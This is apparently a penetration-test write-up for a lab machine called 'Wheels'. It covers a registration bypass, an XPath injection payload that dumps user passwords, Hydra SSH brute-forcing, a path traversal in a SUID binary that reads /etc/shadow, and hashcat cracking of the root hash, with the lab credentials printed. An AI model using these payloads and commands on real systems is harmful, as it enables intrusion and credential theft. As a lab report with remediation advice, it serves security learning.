# Report - Wheels
Author: Henry Post
Target: WHEELS
Target IP: 192.168.66.202
Date: 03/25/2026
# Executive Summary

This machine, Wheels, was enumerated by `nmap` to have HTTP and SSH open.

The login on the HTTP server was bypassed by creating a user account ending with `@wheels.service`.

The HTTP server's `/portal.php` page was used to extract SSH credentials by using XPATH injection.

These credentials were used to gain non-root access.

A SUID binary at `/opt/get-list`was exploited using path traversal to read the hashed password file at `/etc/shadow`. 

We then cracked the `root` user's password with `hashcat` and got root level access.
## Recommendations

Validate XPATH queries. Do not build XPATH queries using stringbuilding.

Do not allow arbitrary users to register accounts.

Validate paths in `/opt/get-list` and do not build folder paths using stringbuilding.

Do not run binaries as root; instead, run them as lower privileged accounts.
# Recon

I ran `nmap -sS -sV WHEELS`. It revealed HTTP and SSH.

![](Pasted%20image%2020260325123957.png)

I visited the site. I noticed at the bottom there was an admin email ending in `@wheels.service`.

![](Pasted%20image%2020260325124507.png)

We create a user called `potato@wheels.service` with login `potato:potato`.

![](Pasted%20image%2020260325124651.png)

This page has an XPATH vulnerability.

![](Pasted%20image%2020260325124745.png)

We can send this query to steal the passwords of all users:

```python
# http://wheels/portal.php?work=car&action=search

# this one works in the `work` param value
')]+|+//password%00

http://wheels/portal.php?work=')]+|+//password%00&action=search
```

![](Pasted%20image%2020260325124853.png)

We save the users, `bob,alice,john`, and the passwords to separate files and use Hydra to brute-force SSH.

```txt
users:

alice
bob
john

passwords:

Iamrockinginmyroom1212
iamarabbitholeand7875
johnloveseverontr8932
lokieismyfav!@#12
alreadydead$%^234
```

```sh
hydra -L users -P passwords ssh://WHEELS
```

![](Pasted%20image%2020260325125320.png)
# Non-root access

We get a credential that works - `bob:Iamrockinginmyroom1212`.

![](Pasted%20image%2020260325125414.png)

We have non-root access.
# Root access

For root access, we need to find a SUID binary.

We use `find / -perm -4000 -type f 2>/dev/null`.

![](Pasted%20image%2020260325125519.png)

We find `/opt/get-list`.

We found this from `strings`:

```
scp bob@WHEELS:/opt/get-list ./
Iamrockinginmyroom1212
strings get-list

Which List do you want to open? [customers/employees]: 
customers
employees
Opening File....
/bin/cat /root/details/%s
/dev/null
Oops something went wrong!!

```

![](Pasted%20image%2020260325125753.png)


This binary is vulnerable to path traversal. We can steal the `/etc/shadow` file.

We know this because we copied the `/opt/get-list` to the attacker machine and run `strings` on it. The `%s` hints at this.

We then use this payload on the victim to read `/etc/shadow`.
```
/opt/get-list 
./../../etc/shadow #employees
```

![](Pasted%20image%2020260325130001.png)

We then crack the hash with this command:

```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

hashcat -m 1800 '$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0' /usr/share/wordlists/rockyou.txt --show
```

![](Pasted%20image%2020260325130045.png)

We have `root:highschoolmusical` as an SSH cred.

![](Pasted%20image%2020260325130119.png)

We have root flag.